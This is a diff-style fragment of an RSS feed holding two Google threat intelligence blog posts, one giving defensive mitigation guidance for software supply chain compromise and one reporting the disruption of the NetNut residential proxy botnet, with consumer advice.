+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Artifact Management:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; To secure the supply chain, organizations can integrate Google's &lt;/span&gt;&lt;a href="https://cloud.google.com/security/products/assured-open-source-software"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Assured Open Source Software&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; into their internal workflows to defend against dependency confusion and malicious hijacking. This process provides "provenance" cryptographically signed evidence that the code has not been tampered with and originates from a verified source thereby establishing a higher level of trust for third-party dependencies.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Quarantine Gates:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Require all binaries, packages, and container images to be hosted in monitored internal repositories. To defend against zero-day dependency hijackings, implement localized "quarantine gates" by enforcing cooling windows on newly published third-party assets.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Lifecycle Script Sandboxing (ignore-scripts)&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Mitigate the critical threat of arbitrary code execution by disabling the automatic running of package install scripts. Attackers commonly hijack dependencies and add malicious post-installation execution scripts to steal credentials from developer environments and runners during routine installs. Organizations should mandate &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;ignore-scripts=true&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; in their repository-level .npmrc files and configure native allowlists, such as pnpm's &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;onlyBuiltDependencies&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, to restrict execution exclusively to verified, essential tools.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Software Composition Analysis (SCA) with Google OSV-Scanner:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Integrate Google's open source &lt;/span&gt;&lt;a href="https://github.com/google/osv.dev" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;OSV-Scanner&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; tool into CI/CD build pipelines to continuously scan project dependencies for known security flaws. This tool provides an officially supported frontend to the OSV.dev database that maps a project's list of dependencies with the specific vulnerabilities affecting them.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;ul&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;High-Fidelity Vulnerability Detection&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Unlike traditional scanners that rely on imprecise name matching, the OSV schema stores vulnerability data in a machine-readable format that maps unambiguously onto version ranges and commit hashes. This results in fewer false positives and produces highly actionable remediation notifications, significantly reducing development team triage overhead.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Authoritative &amp;amp; Collaborative Threat Intel:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; The underlying OSV.dev database aggregates high-quality threat intelligence from authoritative open sources, allowing the broader developer community to suggest continuous improvements. Utilizing OSV-Scanner helps developers identify impactful third-party open source vulnerabilities in their applications and focus remediation on genuine risks.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Hardware-Backed Key Protection:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Secure code-signing certificates using Hardware Security Modules (HSMs) or vaulting solutions. Monitor public transparency ledgers and logs to detect any unauthorized certificate activity.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Hardened Distribution Points:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Audit and lock down software delivery channels, such as Content Delivery Network (CDN) endpoints and FTP servers, to ensure legitimate binaries cannot be replaced by compromised payloads.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Audit NPM Package Maintainer Accounts for Stale or Expired Recovery Email Domains: &lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;Expired maintainer email domains are a critical risk because attackers can purchase them to intercept password reset emails, take over the package registry account, and publish malicious code to downstream users. To identify vulnerable packages, organizations can perform the following:&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;ul&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Deploy automated scanning tools to audit the entire dependency tree and verify the domain name system (DNS) resolution and registration status of all maintainer email domains.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;For defense-in-depth, pipelines must disable package execution scripts and employ cold periods.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Use by default ephemeral, single-use runners to prevent compromised packages from accessing persistent build environments. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Isolate runners in a restricted network segment with strict egress filtering blocks any unauthorized connection to external domains even if an active exploit is triggered.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/ul&gt;
+&lt;h4&gt;&lt;strong style="vertical-align: baseline;"&gt;Integration with Native Ecosystem Guardrails    &lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;These organization-controlled quarantine policies must operate in conjunction with native platform-level security updates to achieve a Defense-in-Depth posture. Relying solely on client-side configurations or automated update tools in isolation creates single points of failure. The following native platform controls must be orchestrated alongside standard controls:&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;a href="https://github.blog/security/supply-chain-security/the-case-for-a-cooldown-why-dependabot-now-waits-before-issuing-version-updates/" rel="noopener" target="_blank"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;Dependabot Native Cooldowns (July 2026)&lt;/strong&gt;&lt;/a&gt;&lt;strong style="vertical-align: baseline;"&gt;:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Dependabot now enforces a default three-day cooldown on version updates to allow for the public discovery of upstream compromises (such as the historical chalk and debug hijackings) before automated Pull Requests are generated].&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;a href="https://blog.pypi.org/posts/2026-07-22-releases-now-reject-new-files-after-14-days/" rel="noopener" target="_blank"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;PyPI Server-Side Immutability (July 2026)]&lt;/strong&gt;&lt;/a&gt;&lt;strong style="vertical-align: baseline;"&gt;:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; PyPI now natively rejects new file uploads to any release older than 14 days. This prevents adversaries possessing compromised tokens from retroactively poisoning legacy, pinned dependencies (as observed in the LiteLLM and Telnyx compromises) .&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;a href="https://github.blog/changelog/2026-06-09-upcoming-breaking-changes-for-npm-v12/" rel="noopener" target="_blank"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;npm v12 Install-Time Defaults (July 2026)&lt;/strong&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;: npm v12 disables all lifecycle scripts by default (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;allowScripts: off)&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; , replacing manual, workflow-level ignore flags with explicit, commit-verified package allow-lists &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;By explicitly aligning baseline configurations including .npmrc and pip.conf registry pinning, immutable installation protocols via npm ci, and runner isolation with these native platform-level guardrails, while committing to the continuous evaluation and adoption of new &lt;/span&gt;&lt;a href="https://github.blog/changelog/?label=supply-chain-security" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;upstream security features&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; as they are released, the organization establishes a resilient, multi-layered security boundary across the entire software supply chain&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Continuous Verification, Monitoring, and Response&lt;/span&gt;&lt;/h4&gt;
+&lt;h5&gt;&lt;em&gt;&lt;span style="vertical-align: baseline;"&gt;Automated Ingestion and Validation&lt;/span&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Automate SBOM Management:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Implement a Software Bill of Materials (SBOM) for all third-party and internal software. This enables continuous monitoring for emerging vulnerabilities like Log4j through automated cross-referencing. Automate and scale this process by feeding SBOMs into central vulnerability management platforms that continuously cross-reference deployed inventory against newly disclosed exploits.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Security Analysis Integration:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Incorporate automated dynamic application security testing (DAST) and static application security testing (SAST) tools within development pipelines to identify and block compromised third-party code before it is compiled.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Verification of Cryptographic Integrity:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Prior to installing updates, use automated systems to validate digital signatures and hashes against vendor-provided specifications.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Implement autonomous security verification&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Organizations should look to integrate advanced security workflows directly into their CI/CD pipelines. These systems can behaviorally evaluate threats by executing simulations in isolated sandboxes, cross-reference those flags with cloud context to determine a flaw's actual reach, and automatically generate tested code patches to rapidly remediate verified risks at scale.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;&lt;em&gt;&lt;span style="vertical-align: baseline;"&gt;Proactive Threat Hunting and Monitoring&lt;/span&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Egress and Proxy Analysis:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Establish network traffic baselines to identify suspicious egress flows to external repositories or unrecognized Internet Protocol (IP) addresses.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Comprehensive Endpoint Security:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Utilize endpoint detection and response (EDR) tools across infrastructure and developer workstations to detect post-execution malicious activities from supply chain compromises.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Log Aggregation and Alerting:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Unified log management should alert on the following anomalies:&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;ul&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Development Systems: Watch for unauthorized code changes, build parameter adjustments, or irregular user activity.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;CI/CD Integrity: Alert on unauthorized workflow modifications or anomalous triggers (e.g., repository_dispatch) that bypass standard code-review gates.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Injection Detection: Monitor logs for shell-escape characters or command-substitution patterns within untrusted input variables.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Credential Misuse: Track authentication hits on long-lived static keys from unrecognized IP addresses or regions.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Physical Assets: Record all firmware modifications, including installation status and source information.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/ul&gt;
+&lt;h5&gt;&lt;em&gt;&lt;span style="vertical-align: baseline;"&gt;Incident Response Strategies&lt;/span&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Specific Supply Chain Playbooks:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Perform tabletop exercises and document response plans for:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Upstream Package Takeover:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Maintainer account takeover (ATO) on public registries leading to direct runtime application code manipulation&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Dependency Confusion Exploits&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Malicious registration of lapsed administrative recovery domains or unscoped internal namespaces on public registries to hijack local developer and build runner installations.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="2" style="list-style-type: circle; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Automated Pipeline Harvesting:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Pipeline poisoning of CI/CD environments via runner exploitation to harvest credentials and perform unauthorized package publication.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Developer Workstation &amp;amp; IDE Compromise: &lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;Targeted social engineering, malicious IDE extensions, or typosquatted local dependencies designed to exfiltrate private cryptographic keys, API tokens, and local session credentials.&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;strong style="vertical-align: baseline;"&gt;Operational Re-evaluation:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Create processes for immediate vendor re-mapping and security re-assessment during industry-wide security events.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Recommendations for mitigation strategies are also available publicly via:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Google's &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/products/application-development/google-introduces-slsa-framework"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Supply-chain Levels for Software Artifacts (SLSA)&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-161r1.pdf" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Cybersecurity Supply Chain Risk Management Practices for Systems and Organizations&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (NIST SP 800-161 Rev. 1) from the US National Institute of Standards and Technology (NIST)&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;a href="https://media.defense.gov/2022/Sep/01/2003068942/-1/-1/0/ESF_SECURING_THE_SOFTWARE_SUPPLY_CHAIN_DEVELOPERS.PDF" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Securing the Software Supply Chain: Recommended Practices Guide for Developers&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; from the US National Security Agency (NSA)&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: disc; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;WIZ SDLC Infrastructure Threat Framework (SITF) &lt;/span&gt;&lt;a href="https://www.wiz.io/blog/sitf-sdlc-threat-framework" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;SDLC Infrastructure Threat Framework&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Acknowledgements&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This analysis would not have been possible without the assistance of Matthew McWhirt and Michael Veal. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</description><pubDate>Thu, 30 Jul 2026 14:00:00 +0000</pubDate><guid>https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise/</guid><category>Threat Intelligence</category><og xmlns:og="http://ogp.me/ns#"><type>article</type><title>Batten Down Your Packages: Mitigation Guidance for Supply Chain Compromise</title><description></description><site_name>Google</site_name><url>https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise/</url></og><author xmlns:author="http://www.w3.org/2005/Atom"><name>Google Threat Intelligence Group </name><title></title><department></department><company></company></author><author xmlns:author="http://www.w3.org/2005/Atom"><name>Mandiant </name><title></title><department></department><company></company></author></item><item><title>Google’s Continued Disruption of Malicious Residential Proxy Networks</title><link>https://cloud.google.com/blog/topics/threat-intelligence/google-continued-disruption-residential-proxy-networks/</link><description>&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Background&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Today, in coordination with the FBI, Lumen, and others, Google took action against the NetNut residential proxy network, also known as Popa. This action builds on our &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/disrupting-largest-residential-proxy-network"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;disruption of the IPIDEA proxy network&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; that took place in January 2026, and is a continuation of Google’s objective to dismantle malicious residential proxy networks.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Actions Taken&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;As a part of this disruption we took the following actions:&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li aria-level="1" style="list-style-type: decimal; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Disabled Google accounts and associated Google services used by NetNut for malware command and control (C2), which directly violates Google’s Terms of Service and Acceptable Use Policy. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: decimal; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;Shared technical intelligence on NetNut software development kits (SDKs) and backend C2 infrastructure with platform providers, law enforcement, and research firms to help drive ecosystem-wide awareness and enforcement.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li aria-level="1" style="list-style-type: decimal; vertical-align: baseline;"&gt;
+&lt;p role="presentation"&gt;&lt;span style="vertical-align: baseline;"&gt;We ensured &lt;/span&gt;&lt;a href="https://support.google.com/googleplay/answer/2812853?hl=en" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Google Play Protect&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, Android’s built-in security protection, automatically warned users and disabled applications known to incorporate NetNut SDKs, and the system will continue to protect users against future install attempts. These efforts to help keep the broader digital ecosystem safe supplement the protections we have to safeguard Android users on certified devices.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;We believe our coordinated actions have caused significant degradation to NetNut’s proxy network and its business operations,&lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt; reducing the available pool of devices for the proxy operator by millions&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;. In addition to selling access to the network under the NetNut brand, NetNut has a robust reseller program that allows whitelabeling of its network. Google has high confidence that many popular residential proxy brands are in fact whitelabeling the NetNut botnet. While we expect this disruption to have a larger ripple effect across the residential proxy ecosystem, observations after the disruption of IPIDEA proved that individual networks can appear resilient. What we have observed is that when faced with the degradation of their own botnet, proxy operators begin buying capacity from their competitors, effectively becoming a reseller. We recognize that creating a lasting disruption in this fluid ecosystem means we must scale our efforts to target the infrastructure of several interconnected providers. We will continue to observe the composition of the NetNut network and map out how its peers adapt to this action.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Why it Matters&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;NetNut is among the largest and most popular residential proxy networks. Estimating the size of residential proxy networks is extremely challenging, but Google Threat Intelligence Group (GTIG) estimates the size of the NetNut network to be at least 2 million devices, distributed across the world. Public reporting by &lt;/span&gt;&lt;a href="https://krebsonsecurity.com/2026/06/popa-botnet-linked-to-publicly-traded-israeli-firm/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;KrebsOnSecurity&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; and others, confirmed by Google, illustrates that NetNut populates its botnet by distributing SDKs for devices commonly found in homes, such as smart TVs and streaming boxes. GTIG has also identified NetNut botnet plugin components for large-scale botnets such as Badbox 2.0.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Residential proxy networks sell the ability to route traffic through IP addresses owned by internet service providers (ISPs), allowing attackers to mask malicious activity by hijacking these IP addresses. A robust residential proxy network requires controlling millions of residential IP addresses to sell to customers for use. To accomplish this, operators need code running on home devices to enroll them into the malicious network as &lt;/span&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;exit nodes.&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; Home devices become part of proxy networks either because they are pre-installed with malware before purchase or because users unknowingly download applications containing hidden proxy code. This creates serious risks for unsuspecting device owners, as their home IP addresses can be used by attackers as a launchpad for hacking and other unauthorized activities. Consequently, users can have their legitimate traffic flagged as suspicious, or blocked by their service providers.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In a single week during June 2026, GTIG observed 316 distinct threat clusters using suspected NetNut exit nodes, including cybercriminal and espionage groups. &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;These bad actors can use NetNut to mask their origin IP address when accessing victim environments, accessing their own infrastructure, and conducting password spray attacks. Furthermore, when a consumer device becomes an exit node, unauthorized network traffic passes through it. This means bad actors can access other private devices on the same home network, effectively exposing them to Internet threats. Public reports by &lt;/span&gt;&lt;a href="https://synthient.com/blog/who-are-the-victims-of-residential-proxies" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Synthient&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://spur.us/blog/residential-proxy-lateral-movement-risk" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Spur&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://github.com/deepfield/public-research/blob/main/reports/2026-06-18-robovpn-neunative.md" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Nokia Deepfield&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, and others have documented the use of NetNut to infect devices with variants of Mirai DDoS botnets.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Empowering and Protecting Consumers&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Consumers should be extremely wary of applications that offer payment in exchange for "unused bandwidth" or "sharing your internet." These applications are primary ways for malicious proxy networks to grow, and could open security vulnerabilities on the device’s home network. We urge users to stick to official app stores, review permissions for third-party VPNs and proxies, and ensure built-in security protections like &lt;/span&gt;&lt;a href="https://support.google.com/googleplay/answer/2812853?hl=en" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Google Play Protect&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; are active.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Consumers should be careful when purchasing connected devices, such as set top boxes, to make sure they are from reputable manufacturers. For example, to help you confirm whether or not a device is built with the official Android TV OS and Play Protect certified, our &lt;/span&gt;&lt;a href="https://www.android.com/tv/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Android TV website&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;provides the most up-to-date list of partners. You can also take&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://support.google.com/googleplay/answer/7165974" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;these steps&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;to check if your Android device is Play Protect certified.&lt;/span&gt;&lt;/p&gt;
